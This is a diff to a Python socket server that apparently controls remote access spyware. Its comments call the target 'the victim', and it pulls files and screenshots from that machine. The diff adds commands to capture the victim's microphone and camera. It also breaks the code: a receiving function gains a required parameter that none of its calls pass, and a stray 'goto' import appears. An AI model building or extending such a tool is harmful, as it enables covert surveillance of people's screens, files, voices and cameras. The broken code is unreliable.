@@ -1,4 +1,6 @@
 import socket
+import goto
+
 
 s = socket.socket()
 s.bind(('127.0.0.1', 7613))
@@ -6,9 +8,15 @@ s.listen(1)
 server_socket, adress = s.accept()
 
 
-def receive_file_from_client():
+def receive_file_from_client(bool):
+    #if (x == True):
+
+
+
+
     # Take from the victim file
     file_path = input("Where do you want save the file?\n")
+
     with open(file_path, 'wb')as f:
         print('Open File')
         while True:
@@ -23,7 +31,7 @@ def receive_file_from_client():
 
 
 def send_file_to_client(data):
-    # Send to the victim file
+    # Send to the victim files
     victim_path = input('Where do you want save the file\n')
     server_socket.sendall(victim_path.encode('utf-8'))
     f = open(data, 'rb')
@@ -67,8 +75,6 @@ def server():
             server_socket.sendall(path.encode('utf-8'))
             receive_file_from_client()
 
-
-
         elif command.startswith('take screenshot '):
             receive_file_from_client()
 
@@ -77,6 +83,12 @@ def server():
             break
 
         elif command.startswith('listen'):
+            receive_file_from_client()
+
+        elif command.startswith('take mic output'):
+            receive_file_from_client()
+
+        elif command.startswith("take camera video"):
             receive_file_from_client()
 
         else:
